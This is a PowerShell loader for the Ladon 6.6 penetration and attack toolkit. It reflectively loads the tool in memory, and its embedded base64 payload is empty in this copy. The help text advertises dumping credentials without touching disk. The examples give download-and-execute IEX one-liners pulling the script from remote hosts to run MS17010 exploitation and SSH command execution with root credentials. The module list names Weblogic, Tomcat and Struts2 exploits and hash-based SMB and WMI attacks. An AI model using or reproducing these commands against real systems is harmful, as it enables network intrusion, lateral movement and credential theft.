#Ladon 6.6 for PowerShell
function Ladon
{
<#
.SYNOPSIS

This script leverages Ladon 6.6 and Reflection.Assembly to reflectively load Ladon completely in memory. This allows you to do things such as
dump credentials without ever writing the Ladon binary to disk. 

Function: Ladon (https://github.com/k8gege/Ladon)
Author: K8gege (https://k8gege.org)
License:  MIT
Required Dependencies: Ladon (included)
Optional Dependencies: None
Ladon version: 6.6 (20200704)

.DESCRIPTION

Reflectively loads Ladon 6.6 in memory using PowerShell. Can be used to scan network without writing anything to disk. Can be used for any 
functionality provided with Ladon.

.TestON

Win7 x86  (Microsoft Windows [6.1.7601])
Win8 x64  (Microsoft Windows [6.2.9200])
Win10 x64 (Microsoft Windows [10.0.14393])

.EXAMPLE

Execute Ladon on the local computer to scan network OnlinePC.
Ladon OnlinePC
Ladon 192.168.1.8/24 OnlinePC


0x001 Cmd
powershell 
Import-Module .\Ladon.ps1
Ladon OnlinePC

0x002 Local
powershell Import-Module .\Ladon.ps1;Ladon OnlinePC

0x003 Remote
powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon OnlinePC"

0x004 MS17010
powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.110:800/Ladon6.6_all.ps1'); Ladon 10.1.10.1/24 MS17010"

0x005 SshExec
powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.110:800/Ladon6.6_all.ps1'); Ladon sshexec 192.168.1.112 22 root k8gege whoami"

#&gt;
Param      
(       
[parameter(
#Mandatory = $true,
Position = 0
)]
$Q7MGIzea = "help",
[parameter(
Position = 1
)]
$z9cZmQB = "OnlinePC",
[parameter(
Position = 2
)]
$z8kaB = "",
[parameter(
Position = 3
)]
$K20Bad = "",
[parameter(
Position = 4
)]
$e39K9U = "",
[parameter(
Position = 5
)]
$bH8T3b
)

$kh89K = @'
'@
$8Hz8 = New-object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($kh89K),[IO.Compression.CompressionMode]::Decompress)
$S7B1p = New-object Byte[](1442816)
$8Hz8.Read($S7B1p, 0, 1442816) | Out-Null
$FkDM7 = [Reflection.Assembly]::Load($S7B1p).GetType('Ladon.Scan')
If([String]::IsNullOrEmpty($bH8T3b)){ If([String]::IsNullOrEmpty($e39K9U)){ If([String]::IsNullOrEmpty($K20Bad)){ If([String]::IsNullOrEmpty($z8kaB)){ If($Q7MGIzea -eq "OnlinePC" -or $Q7MGIzea -eq "OnlineIP" -or $Q7MGIzea -eq "OsScan" -or $Q7MGIzea -eq "PortScan" -or $Q7MGIzea -eq "CiscoScan" -or $Q7MGIzea -eq "WebScan" -or $Q7MGIzea -eq "SameWeb" -or $Q7MGIzea -eq "UrlScan" -or $Q7MGIzea -eq "WhatCMS" -or $Q7MGIzea -eq "WebDir" -or $Q7MGIzea -eq "SubDomain" -or $Q7MGIzea -eq "HostIP" -or $Q7MGIzea -eq "DomainIP" -or $Q7MGIzea -eq "MS17010" -or $Q7MGIzea -eq "WeblogicPoc" -or $Q7MGIzea -eq "WeblogicExp" -or $Q7MGIzea -eq "PhpStudyPoc" -or $Q7MGIzea -eq "TomcatPoc" -or $Q7MGIzea -eq "Struts2Poc" -or $Q7MGIzea -eq "TomcatExp" -or $Q7MGIzea -eq "ActivemqPoc" -or $Q7MGIzea -eq "FtpScan" -or $Q7MGIzea -eq "WmiScan" -or $Q7MGIzea -eq "WmiHashScan" -or $Q7MGIzea -eq "WmiHash" -or $Q7MGIzea -eq "IpcScan" -or $Q7MGIzea -eq "SmbScan" -or $Q7MGIzea -eq "SmbHash" -or $Q7MGIzea -eq "SmbHashScan" -or $Q7MGIzea -eq "VncScan" -or $Q7MGIzea -eq "MysqlScan" -or $Q7MGIzea -eq "MssqlScan" -or $Q7MGIzea -eq "OracleScan" -or $Q7MGIzea -eq "SshScan" -or $Q7MGIzea -eq "WeblogicScan" -or $Q7MGIzea -eq "RarScan" -or $Q7MGIzea -eq "EnumMSSQL" -or $Q7MGIzea -eq "EnumShare" -or $Q7MGIzea -eq "EnHex" -or $Q7MGIzea -eq "DeHex" -or $Q7MGIzea -eq "EnBase64" -or $Q7MGIzea -eq "DeBase64" -or $Q7MGIzea -eq "GetIP" -or $Q7MGIzea -eq "NetVer"){$z9cZmQB=""}If([String]::IsNullOrEmpty($z9cZmQB))
{$FkDM7::Main(@($Q7MGIzea))}else{$FkDM7::Main(@($Q7MGIzea,$z9cZmQB))}  }else{$FkDM7::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB))} }else{$FkDM7::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$K20Bad))} }else{$FkDM7::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$K20Bad,$e39K9U))} }else{$FkDM7::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$K20Bad,$e39K9U,$bH8T3b))}
}
# SIG # Begin signature block
# MIIFpwYJKoZIhvcNAQcCoIIFmDCCBZQCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUMHNybP1U7G5Hyu3ZBScz37fr
# 8jKgggM5MIIDNTCCAiGgAwIBAgIQSd0/SMu/Y69FkbjapuDDZDAJBgUrDgMCHQUA
# MCMxITAfBgNVBAMTGE1vc3NlclBvd2VyU2hlbGxUZXN0Q2VydDAeFw0yMDA0MTcw
# NDQzNTRaFw0zOTEyMzEyMzU5NTlaMCMxITAfBgNVBAMTGE1vc3NlclBvd2VyU2hl
# bGxUZXN0Q2VydDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOUMwXSV
# OcWZt3bjtl84lhzXxkJpFGPuysJZh+1nWfTjyLprd5swNxjaOi9K0pA+lZa8SSVO
# MsYi+oSYuaPmh5aAdPdF3o943FJv8WXnE9Su6Xp+8W1rF+scK4+N7DPBdC1Dx9+d
# SRDzqi75mH6On59/9cADQVLyrxGp7O7w5ehUitHsMQx+/JZJPFAmXaUlpcxrgekz
# xLjAjYsXX9rHz8xHNLgu78iPjRKg2GdvB19vertrkC1tAa9YHLY7weBb5JCTbdaQ
# ZJKZhXtIkv+0SMcnXsJO03i9jn5e5g6kpWp7Haelpx7nE/BiT6Kmg9DrnMVbmVGD
# IwamWUp8MeOum+cCAwEAAaNtMGswEwYDVR0lBAwwCgYIKwYBBQUHAwMwVAYDVR0B
# BE0wS4AQcnzMWCdvKRnSnsQlyBiHRqElMCMxITAfBgNVBAMTGE1vc3NlclBvd2Vy
# U2hlbGxUZXN0Q2VydIIQSd0/SMu/Y69FkbjapuDDZDAJBgUrDgMCHQUAA4IBAQB1
# UePrLXHjIu5Xj4/UPTiHIwHnxKDFZB7AY/evcsW2rBLf/fKaCbX7q4c546zkmWW+
# mv1lp9jIsDaR9X3cS6PrDdoOZM3Z4PvNt80qsKkDTUGl+RvTNpZ6UOGctqQoflfp
# BJvu85JJEH3goiSwR4DRCsP9j4dDGTYKvV7CFZzpArooTO40uG1Go4J0Hg3LPdBs
# /XBWTgZ7bHfUxD8eNUtinsbHyQ5551GbUSdHQWiyUH8o+yDlaRZQd89m0Nxnj8cO
# Pc0XJRelOOoa9SgPtybBR5igC0mamD4O0cZZ8SpZ1NZeBeqgg1auyY3KqmUgnfnk
# VexTAaYWGErOvquAmBavMYIB2DCCAdQCAQEwNzAjMSEwHwYDVQQDExhNb3NzZXJQ
# b3dlclNoZWxsVGVzdENlcnQCEEndP0jLv2OvRZG42qbgw2QwCQYFKw4DAhoFAKB4
# MBgGCisGAQQBgjcCAQwxCjAIoAKAAKECgAAwGQYJKoZIhvcNAQkDMQwGCisGAQQB
# gjcCAQQwHAYKKwYBBAGCNwIBCzEOMAwGCisGAQQBgjcCARUwIwYJKoZIhvcNAQkE
# MRYEFPEbPdjXt6UWygxUEYsk9ABT1jfrMA0GCSqGSIb3DQEBAQUABIIBAAoIqmBE
# DzOn0AWvXRs7FHHbbiDeiU196/agxf214iGOwoa44ol1aJsPWWt/Um3+yHb4aeAz
# wLF6pxI1K8dgD68RfE1QaCv1Op46LN734C4BsAxr6ncNSFi3hrWltrrEJoa6dSEv
# c5zOq2fAWwMrunxR9XRU8G2w/0Ys05mLgJjYxXRMWU68ENTprLNM0x4wWn9oK0yk
# 8Pqw6bSO3JOnMq2AzXrY+dqcMILLJocfCBjfLxa1lOAqNRaiYhXce/AxFs96RpNR
# zFjxSDn1JUkr72BsL5th6sIdihaaLoHechbKPMc19KrP1+sfbLRZ1SXP5qErYXk1
# ygCf5PD+CjQ3KCw=
# SIG # End signature block